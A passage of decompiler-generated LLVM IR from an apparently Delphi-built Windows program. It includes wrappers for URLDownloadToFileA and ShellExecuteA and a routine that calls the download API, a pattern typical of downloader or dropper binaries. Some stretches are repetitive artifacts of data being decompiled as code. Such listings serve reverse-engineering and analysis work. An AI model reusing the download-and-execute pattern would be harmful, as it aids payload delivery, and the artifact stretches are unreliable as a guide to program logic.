  %209 = load i8, i8* %208, align 1, !insn.addr !366
  %210 = trunc i32 %207 to i8, !insn.addr !366
  %211 = add i8 %209, %210, !insn.addr !366
  store i8 %211, i8* %208, align 1, !insn.addr !366
  %212 = load i32, i32* %eax, align 4
  %213 = inttoptr i32 %212 to i8*, !insn.addr !367
  %214 = load i8, i8* %213, align 1, !insn.addr !367
  %215 = trunc i32 %212 to i8, !insn.addr !367
  %216 = add i8 %214, %215, !insn.addr !367
  store i8 %216, i8* %213, align 1, !insn.addr !367
  %217 = load i32, i32* %eax, align 4
  %218 = inttoptr i32 %217 to i8*, !insn.addr !368
  %219 = load i8, i8* %218, align 1, !insn.addr !368
  %220 = trunc i32 %217 to i8, !insn.addr !368
  %221 = add i8 %219, %220, !insn.addr !368
  store i8 %221, i8* %218, align 1, !insn.addr !368
  %222 = load i32, i32* %eax, align 4
  %223 = inttoptr i32 %222 to i8*, !insn.addr !369
  %224 = load i8, i8* %223, align 1, !insn.addr !369
  %225 = trunc i32 %222 to i8, !insn.addr !369
  %226 = add i8 %224, %225, !insn.addr !369
  store i8 %226, i8* %223, align 1, !insn.addr !369
  %227 = load i32, i32* %eax, align 4
  %228 = inttoptr i32 %227 to i8*, !insn.addr !370
  %229 = load i8, i8* %228, align 1, !insn.addr !370
  %230 = trunc i32 %227 to i8, !insn.addr !370
  %231 = add i8 %229, %230, !insn.addr !370
  store i8 %231, i8* %228, align 1, !insn.addr !370
  %232 = load i32, i32* %eax, align 4
  %233 = inttoptr i32 %232 to i8*, !insn.addr !371
  %234 = load i8, i8* %233, align 1, !insn.addr !371
  %235 = trunc i32 %232 to i8, !insn.addr !371
  %236 = add i8 %234, %235, !insn.addr !371
  store i8 %236, i8* %233, align 1, !insn.addr !371
  %237 = load i32, i32* %eax, align 4
  %238 = inttoptr i32 %237 to i8*, !insn.addr !372
  %239 = load i8, i8* %238, align 1, !insn.addr !372
  %240 = trunc i32 %237 to i8, !insn.addr !372
  %241 = add i8 %239, %240, !insn.addr !372
  store i8 %241, i8* %238, align 1, !insn.addr !372
  %242 = load i32, i32* %eax, align 4
  %243 = inttoptr i32 %242 to i8*, !insn.addr !373
  %244 = load i8, i8* %243, align 1, !insn.addr !373
  %245 = trunc i32 %242 to i8, !insn.addr !373
  %246 = add i8 %244, %245, !insn.addr !373
  store i8 %246, i8* %243, align 1, !insn.addr !373
  %247 = load i32, i32* %eax, align 4
  %248 = inttoptr i32 %247 to i8*, !insn.addr !374
  %249 = load i8, i8* %248, align 1, !insn.addr !374
  %250 = trunc i32 %247 to i8, !insn.addr !374
  %251 = add i8 %249, %250, !insn.addr !374
  store i8 %251, i8* %248, align 1, !insn.addr !374
  %252 = load i32, i32* %eax, align 4
  %253 = inttoptr i32 %252 to i8*, !insn.addr !375
  %254 = load i8, i8* %253, align 1, !insn.addr !375
  %255 = trunc i32 %252 to i8, !insn.addr !375
  %256 = add i8 %254, %255, !insn.addr !375
  store i8 %256, i8* %253, align 1, !insn.addr !375
  %257 = load i32, i32* %eax, align 4
  %258 = inttoptr i32 %257 to i8*, !insn.addr !376
  %259 = load i8, i8* %258, align 1, !insn.addr !376
  %260 = trunc i32 %257 to i8, !insn.addr !376
  %261 = add i8 %259, %260, !insn.addr !376
  store i8 %261, i8* %258, align 1, !insn.addr !376
  %262 = inttoptr i32 %2 to i8*, !insn.addr !377
  %263 = load i8, i8* %262, align 1, !insn.addr !377
  %264 = udiv i32 %2, 256, !insn.addr !377
  %265 = trunc i32 %264 to i8, !insn.addr !377
  %266 = add i8 %263, %265, !insn.addr !377
  store i8 %266, i8* %262, align 1, !insn.addr !377
  %267 = xor i8 %266, %265, !insn.addr !378
  %268 = zext i8 %267 to i32, !insn.addr !378
  %269 = mul i32 %268, 256, !insn.addr !378
  %270 = and i32 %2, -65281, !insn.addr !378
  %271 = or i32 %269, %270, !insn.addr !378
  %272 = inttoptr i32 %271 to i32*, !insn.addr !379
  %273 = load i32, i32* %272, align 4, !insn.addr !379
  %274 = xor i32 %273, %146, !insn.addr !379
  store i32 %274, i32* %272, align 4, !insn.addr !379
  %275 = load i32, i32* %eax, align 4
  %276 = inttoptr i32 %275 to i32*, !insn.addr !380
  %277 = load i32, i32* %276, align 4, !insn.addr !380
  %278 = xor i32 %277, %275, !insn.addr !380
  %279 = inttoptr i32 %278 to i8*, !insn.addr !381
  %280 = load i8, i8* %279, align 1, !insn.addr !381
  %281 = trunc i32 %278 to i8, !insn.addr !381
  %factor = mul i8 %281, 24
  %282 = add i8 %factor, %280, !insn.addr !382
  store i8 %282, i8* %279, align 1, !insn.addr !382
  ret i32 %278, !insn.addr !382

dec_label_pc_404916:                              ; preds = %dec_label_pc_404891
  %283 = load i32, i32* %eax, align 4
  %284 = inttoptr i32 %283 to i8*, !insn.addr !383
  %285 = load i8, i8* %284, align 1, !insn.addr !383
  %286 = trunc i32 %283 to i8, !insn.addr !383
  %287 = add i8 %285, %286, !insn.addr !383
  store i8 %287, i8* %284, align 1, !insn.addr !383
  %288 = load i32, i32* %eax, align 4
  %289 = inttoptr i32 %288 to i8*, !insn.addr !384
  %290 = load i8, i8* %289, align 1, !insn.addr !384
  %291 = trunc i32 %288 to i8, !insn.addr !384
  %292 = add i8 %290, %291, !insn.addr !384
  store i8 %292, i8* %289, align 1, !insn.addr !384
  %293 = load i32, i32* %eax, align 4
  %294 = inttoptr i32 %293 to i8*, !insn.addr !385
  %295 = load i8, i8* %294, align 1, !insn.addr !385
  %296 = trunc i32 %293 to i8, !insn.addr !385
  %297 = add i8 %295, %296, !insn.addr !385
  store i8 %297, i8* %294, align 1, !insn.addr !385
  %298 = load i32, i32* %eax, align 4
  %299 = inttoptr i32 %298 to i8*, !insn.addr !386
  %300 = load i8, i8* %299, align 1, !insn.addr !386
  %301 = trunc i32 %298 to i8, !insn.addr !386
  %302 = add i8 %300, %301, !insn.addr !386
  store i8 %302, i8* %299, align 1, !insn.addr !386
  %303 = load i32, i32* %eax, align 4
  %304 = inttoptr i32 %303 to i8*, !insn.addr !387
  %305 = load i8, i8* %304, align 1, !insn.addr !387
  %306 = trunc i32 %303 to i8, !insn.addr !387
  %307 = add i8 %305, %306, !insn.addr !387
  store i8 %307, i8* %304, align 1, !insn.addr !387
  %308 = load i32, i32* %eax, align 4
  %309 = inttoptr i32 %308 to i8*
  %310 = load i8, i8* %309, align 1
  %311 = trunc i32 %308 to i8
  %312 = add i8 %310, %311
  store i8 %312, i8* %309, align 1
  %313 = load i32, i32* %eax, align 4
  %314 = inttoptr i32 %313 to i8*
  %315 = load i8, i8* %314, align 1
  %316 = trunc i32 %313 to i8
  %317 = add i8 %315, %316
  store i8 %317, i8* %314, align 1
  %318 = load i32, i32* %eax, align 4
  ret i32 %318, !insn.addr !388
}

define i32 @function_404a05() local_unnamed_addr {
dec_label_pc_404a05:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !389
  ret i32 %0, !insn.addr !389
}

define i32 @function_404a0a() local_unnamed_addr {
dec_label_pc_404a0a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !390
}

define i32 @function_404a0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a0c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !391
}

define i32 @function_404a10() local_unnamed_addr {
dec_label_pc_404a10:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40968c, align 4, !insn.addr !392
  %2 = add i32 %1, -1, !insn.addr !392
  store i32 %2, i32* @global_var_40968c, align 4, !insn.addr !392
  ret i32 %0, !insn.addr !393
}

define i32* @function_404a18(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd) local_unnamed_addr {
dec_label_pc_404a18:
  %0 = call i32* @ShellExecuteA(i32* %hwnd, i8* %lpOperation, i8* %lpFile, i8* %lpParameters, i8* %lpDirectory, i32 %nShowCmd), !insn.addr !394
  ret i32* %0, !insn.addr !394
}

define i32 @function_404a20() local_unnamed_addr {
dec_label_pc_404a20:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !395
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !395
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !395
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !396
  %2 = load i32, i32* @global_var_409690, align 4, !insn.addr !397
  %3 = add i32 %2, 1, !insn.addr !397
  store i32 %3, i32* @global_var_409690, align 4, !insn.addr !397
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !398
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !399
  ret i32 0, !insn.addr !400
}

define i32 @function_404a45() local_unnamed_addr {
dec_label_pc_404a45:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !401
  ret i32 %0, !insn.addr !401
}

define i32 @function_404a4a() local_unnamed_addr {
dec_label_pc_404a4a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !402
}

define i32 @function_404a4c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a4c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !403
}

define i32 @function_404a50() local_unnamed_addr {
dec_label_pc_404a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409690, align 4, !insn.addr !404
  %2 = add i32 %1, -1, !insn.addr !404
  store i32 %2, i32* @global_var_409690, align 4, !insn.addr !404
  ret i32 %0, !insn.addr !405
}

define i32 @function_404a58() local_unnamed_addr {
dec_label_pc_404a58:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !406
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !406
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !406
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !407
  %2 = load i32, i32* @global_var_409694, align 4, !insn.addr !408
  %3 = add i32 %2, 1, !insn.addr !408
  store i32 %3, i32* @global_var_409694, align 4, !insn.addr !408
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !409
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !410
  ret i32 0, !insn.addr !411
}

define i32 @function_404a7d() local_unnamed_addr {
dec_label_pc_404a7d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !412
  ret i32 %0, !insn.addr !412
}

define i32 @function_404a82() local_unnamed_addr {
dec_label_pc_404a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !413
}

define i32 @function_404a84(i32 %arg1) local_unnamed_addr {
dec_label_pc_404a84:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !414
}

define i32 @function_404a88() local_unnamed_addr {
dec_label_pc_404a88:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409694, align 4, !insn.addr !415
  %2 = add i32 %1, -1, !insn.addr !415
  store i32 %2, i32* @global_var_409694, align 4, !insn.addr !415
  ret i32 %0, !insn.addr !416
}

define i32 @function_404a90() local_unnamed_addr {
dec_label_pc_404a90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !417
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !417
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !417
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !418
  %2 = load i32, i32* @global_var_409698, align 4, !insn.addr !419
  %3 = add i32 %2, 1, !insn.addr !419
  store i32 %3, i32* @global_var_409698, align 4, !insn.addr !419
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !420
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !421
  ret i32 0, !insn.addr !422
}

define i32 @function_404ab5() local_unnamed_addr {
dec_label_pc_404ab5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !423
  ret i32 %0, !insn.addr !423
}

define i32 @function_404aba() local_unnamed_addr {
dec_label_pc_404aba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !424
}

define i32 @function_404abc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !425
}

define i32 @function_404ac0() local_unnamed_addr {
dec_label_pc_404ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409698, align 4, !insn.addr !426
  %2 = add i32 %1, -1, !insn.addr !426
  store i32 %2, i32* @global_var_409698, align 4, !insn.addr !426
  ret i32 %0, !insn.addr !427
}

define i32 @function_404ac8(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5) local_unnamed_addr {
dec_label_pc_404ac8:
  %0 = call i32 @URLDownloadToFileA(i32* %arg1, i8* %arg2, i8* %arg3, i32 %arg4, i32* %arg5), !insn.addr !428
  ret i32 %0, !insn.addr !428
}

define i32 @function_404ad0() local_unnamed_addr {
dec_label_pc_404ad0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !429
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !429
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !429
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !430
  %2 = load i32, i32* @global_var_40969c, align 4, !insn.addr !431
  %3 = add i32 %2, 1, !insn.addr !431
  store i32 %3, i32* @global_var_40969c, align 4, !insn.addr !431
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !432
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !433
  ret i32 0, !insn.addr !434
}

define i32 @function_404af5() local_unnamed_addr {
dec_label_pc_404af5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !435
  ret i32 %0, !insn.addr !435
}

define i32 @function_404afa() local_unnamed_addr {
dec_label_pc_404afa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !436
}

define i32 @function_404afc(i32 %arg1) local_unnamed_addr {
dec_label_pc_404afc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !437
}

define i32 @function_404b00() local_unnamed_addr {
dec_label_pc_404b00:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !438
  %2 = add i32 %1, -1, !insn.addr !438
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !438
  ret i32 %0, !insn.addr !439
}

define i32 @function_404b08() local_unnamed_addr {
dec_label_pc_404b08:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8, !insn.addr !440
  %2 = icmp ult i8 %1, 10
  %3 = and i32 %0, 255
  br i1 %2, label %dec_label_pc_404b0c, label %dec_label_pc_404b15, !insn.addr !441

dec_label_pc_404b0c:                              ; preds = %dec_label_pc_404b08
  %4 = add nuw nsw i32 %3, 48, !insn.addr !442
  ret i32 %4, !insn.addr !443

dec_label_pc_404b15:                              ; preds = %dec_label_pc_404b08
  %5 = add nuw nsw i32 %3, 55, !insn.addr !444
  ret i32 %5, !insn.addr !445
}

define i32 @function_404b20() local_unnamed_addr {
dec_label_pc_404b20:
  %esp.2.reg2mem = alloca i32, !insn.addr !446
  %esp.1.reg2mem = alloca i32, !insn.addr !446
  %cf.0.reg2mem = alloca i1, !insn.addr !446
  %esi.0.reg2mem = alloca i32, !insn.addr !446
  %esp.0.reg2mem = alloca i32, !insn.addr !446
  %ebx.0.reg2mem = alloca i32, !insn.addr !446
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %1 = call i32 @function_4036b8(), !insn.addr !447
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !448
  store i32 %2, i32* %stack_var_-52, align 4, !insn.addr !448
  %3 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !448
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !449
  %4 = call i32 @"@LStrClr"(), !insn.addr !450
  %5 = call i32 @function_4034c8(), !insn.addr !451
  %6 = icmp slt i32 %5, 1
  store i32 %3, i32* %esp.2.reg2mem, !insn.addr !452
  br i1 %6, label %dec_label_pc_404c21, label %dec_label_pc_404b6d.preheader, !insn.addr !452

dec_label_pc_404b6d.preheader:                    ; preds = %dec_label_pc_404b20
  %7 = add i32 %0, -1, !insn.addr !453
  store i32 1, i32* %ebx.0.reg2mem
  store i32 %3, i32* %esp.0.reg2mem
  store i32 %5, i32* %esi.0.reg2mem
  br label %dec_label_pc_404b6d

dec_label_pc_404b6d:                              ; preds = %dec_label_pc_404b6d.preheader, %dec_label_pc_404c19
  %esi.0.reload = load i32, i32* %esi.0.reg2mem
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %8 = add i32 %7, %ebx.0.reload, !insn.addr !453
  %9 = inttoptr i32 %8 to i8*, !insn.addr !453
  %10 = load i8, i8* %9, align 1, !insn.addr !453
  %11 = icmp eq i8 %10, 32, !insn.addr !453
  %12 = icmp eq i1 %11, false, !insn.addr !454
  br i1 %12, label %dec_label_pc_404b88, label %dec_label_pc_404b77, !insn.addr !454

dec_label_pc_404b77:                              ; preds = %dec_label_pc_404b6d
  %13 = call i32 @"@LStrCat"(), !insn.addr !455
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !456
  br label %dec_label_pc_404c19, !insn.addr !456

dec_label_pc_404b88:                              ; preds = %dec_label_pc_404b6d
  %14 = icmp ult i8 %10, 32, !insn.addr !457
  br i1 %14, label %dec_label_pc_404bab, label %dec_label_pc_404b92, !insn.addr !458

dec_label_pc_404b92:                              ; preds = %dec_label_pc_404b88
  %15 = add i8 %10, -32, !insn.addr !459
  %16 = icmp ult i8 %15, 95, !insn.addr !460
  %17 = icmp ult i8 %15, 96
  store i1 %16, i1* %cf.0.reg2mem, !insn.addr !461
  br i1 %17, label %dec_label_pc_404b9f, label %dec_label_pc_404ba9, !insn.addr !461

dec_label_pc_404b9f:                              ; preds = %dec_label_pc_404b92
  %18 = load i32, i32* inttoptr (i32 4213856 to i32*), align 32, !insn.addr !462
  %19 = and i8 %15, 31
  %20 = zext i8 %19 to i32, !insn.addr !462
  %21 = shl i32 1, %20, !insn.addr !462
  %22 = and i32 %18, %21, !insn.addr !462
  %23 = icmp ne i32 %22, 0, !insn.addr !462
  store i1 %23, i1* %cf.0.reg2mem, !insn.addr !462
  br label %dec_label_pc_404ba9, !insn.addr !462

dec_label_pc_404ba9:                              ; preds = %dec_label_pc_404b92, %dec_label_pc_404b9f
  %cf.0.reload = load i1, i1* %cf.0.reg2mem
  %24 = icmp eq i1 %cf.0.reload, false, !insn.addr !463
  br i1 %24, label %dec_label_pc_404c00, label %dec_label_pc_404bab, !insn.addr !463

dec_label_pc_404bab:                              ; preds = %dec_label_pc_404ba9, %dec_label_pc_404b88
  %25 = and i8 %10, 15
  %26 = zext i8 %25 to i32, !insn.addr !464
  %27 = add i32 %esp.0.reload, -4, !insn.addr !465
  %28 = inttoptr i32 %27 to i32*, !insn.addr !465
  store i32 %26, i32* %28, align 4, !insn.addr !465
  %29 = add i32 %esp.0.reload, -8, !insn.addr !466
  %30 = inttoptr i32 %29 to i32*, !insn.addr !466
  store i32 ptrtoint (i32* @global_var_404c74 to i32), i32* %30, align 4, !insn.addr !466
  %31 = call i32 @function_404b08(), !insn.addr !467
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !468
  %33 = add i32 %esp.0.reload, -12, !insn.addr !469
  %34 = inttoptr i32 %33 to i32*, !insn.addr !469
  store i32 0, i32* %34, align 4, !insn.addr !469
  %35 = call i32 @function_404b08(), !insn.addr !470
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !471
  %37 = add i32 %esp.0.reload, -16, !insn.addr !472
  %38 = inttoptr i32 %37 to i32*, !insn.addr !472
  store i32 0, i32* %38, align 4, !insn.addr !472
  %39 = call i32 @"@LStrCatN"(), !insn.addr !473
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !474
  br label %dec_label_pc_404c19, !insn.addr !474

dec_label_pc_404c00:                              ; preds = %dec_label_pc_404ba9
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !475
  %41 = call i32 @"@LStrCat"(), !insn.addr !476
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !476
  br label %dec_label_pc_404c19, !insn.addr !476

dec_label_pc_404c19:                              ; preds = %dec_label_pc_404c00, %dec_label_pc_404bab, %dec_label_pc_404b77
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !477
  %43 = add i32 %esi.0.reload, -1, !insn.addr !478
  %44 = icmp eq i32 %43, 0, !insn.addr !478
  %45 = icmp eq i1 %44, false, !insn.addr !479
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !479
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !479
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !479
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !479
  br i1 %45, label %dec_label_pc_404b6d, label %dec_label_pc_404c21, !insn.addr !479

dec_label_pc_404c21:                              ; preds = %dec_label_pc_404c19, %dec_label_pc_404b20
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !480
  %47 = load i32, i32* %46, align 4, !insn.addr !480
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !481
  %48 = add i32 %esp.2.reload, 8, !insn.addr !482
  %49 = inttoptr i32 %48 to i32*, !insn.addr !482
  store i32 4213835, i32* %49, align 4, !insn.addr !482
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !483
  %51 = call i32 @"@LStrClr"(), !insn.addr !484
  ret i32 %51, !insn.addr !485
}

define i32 @function_404c44() local_unnamed_addr {
dec_label_pc_404c44:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !486
  ret i32 %0, !insn.addr !486
}

define i32 @function_404c49() local_unnamed_addr {
dec_label_pc_404c49:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !487
}

define i32 @function_404c4b(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c4b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !488
}

define i32 @function_404c6f() local_unnamed_addr {
dec_label_pc_404c6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !489
  %2 = inttoptr i32 %0 to i32*, !insn.addr !489
  store i32 %1, i32* %2, align 4, !insn.addr !489
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !490
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !490
  %7 = add i8 %4, %6, !insn.addr !490
  %8 = inttoptr i32 %5 to i8*, !insn.addr !490
  store i8 %7, i8* %8, align 1, !insn.addr !490
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !491
  %10 = load i32, i32* %eax, align 4, !insn.addr !491
  %11 = udiv i32 %10, 256, !insn.addr !491
  %12 = trunc i32 %11 to i8, !insn.addr !491
  %13 = add i8 %9, %12, !insn.addr !491
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !491
  %14 = call i32 @function_4036b8(), !insn.addr !492
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !493
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !493
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !493
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !494
  %17 = call i32 @"@LStrCatN"(), !insn.addr !495
  %18 = call i32 @function_4036c8(), !insn.addr !496
  %19 = inttoptr i32 %18 to i32*, !insn.addr !497
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !497
  call void @__writefsdword(i32 0, i32 0), !insn.addr !498
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !499
  ret i32 %21, !insn.addr !500
}

define i32 @function_404c78() local_unnamed_addr {
dec_label_pc_404c78:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404ce6() local_unnamed_addr {
dec_label_pc_404ce6:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !501
  ret i32 %0, !insn.addr !501
}

define i32 @function_404ceb() local_unnamed_addr {
dec_label_pc_404ceb:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !502
}

define i32 @function_404ced(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !503
}

define i32 @function_404cf7() local_unnamed_addr {
dec_label_pc_404cf7:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !504
  %5 = inttoptr i32 %3 to i32*, !insn.addr !504
  store i32 %4, i32* %5, align 4, !insn.addr !504
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !505
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !505
  %10 = add i8 %7, %9, !insn.addr !505
  %11 = inttoptr i32 %8 to i8*, !insn.addr !505
  store i8 %10, i8* %11, align 1, !insn.addr !505
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !506
  %14 = udiv i32 %1, 256, !insn.addr !506
  %15 = trunc i32 %14 to i8, !insn.addr !506
  %16 = add i8 %13, %15, !insn.addr !506
  %17 = load i32, i32* %edi, align 4, !insn.addr !506
  %18 = inttoptr i32 %17 to i8*, !insn.addr !506
  store i8 %16, i8* %18, align 1, !insn.addr !506
  %19 = load i8, i8* %6, align 4, !insn.addr !507
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !507
  %22 = add i8 %19, %21, !insn.addr !507
  %23 = inttoptr i32 %20 to i8*, !insn.addr !507
  store i8 %22, i8* %23, align 1, !insn.addr !507
  %24 = add i32 %0, -117, !insn.addr !508
  %25 = inttoptr i32 %24 to i8*, !insn.addr !508
  %26 = load i8, i8* %25, align 1, !insn.addr !508
  %27 = trunc i32 %2 to i8, !insn.addr !508
  %28 = add i8 %26, %27, !insn.addr !508
  store i8 %28, i8* %25, align 1, !insn.addr !508
  %29 = trunc i32 %2 to i16, !insn.addr !509
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !509
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !510
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !510
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !510
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !511
  %33 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !512
  %34 = add i32 %33, 1, !insn.addr !512
  store i32 %34, i32* @global_var_4096a0, align 4, !insn.addr !512
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !513
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !514
  ret i32 0, !insn.addr !515
}

define i32 @function_404d25() local_unnamed_addr {
dec_label_pc_404d25:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !516
  ret i32 %0, !insn.addr !516
}

define i32 @function_404d2a() local_unnamed_addr {
dec_label_pc_404d2a:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !517
}

define i32 @function_404d2c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d2c:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !518
}

define i32 @function_404d30() local_unnamed_addr {
dec_label_pc_404d30:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !519
  %2 = add i32 %1, -1, !insn.addr !519
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !519
  ret i32 %0, !insn.addr !520
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %eax.0.reg2mem = alloca i32, !insn.addr !521
  %stack_var_-132 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %0 = call i32 @"@LStrAsg"(), !insn.addr !522
  store i32 0, i32* %stack_var_-116, align 4, !insn.addr !523
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !524
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i8** %stack_var_-132, align 4, !insn.addr !525
  %1 = call i32 @function_40438c(i32 0, i32* nonnull %stack_var_-116, i32 1, i32 0, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @global_var_404dc4, i32 0, i32 0), i32 -2147483647), !insn.addr !526
  %2 = icmp eq i32 %1, 0, !insn.addr !527
  %3 = icmp eq i1 %2, false, !insn.addr !528
  store i32 %1, i32* %eax.0.reg2mem, !insn.addr !528
  br i1 %3, label %dec_label_pc_404db2, label %dec_label_pc_404d6d, !insn.addr !528

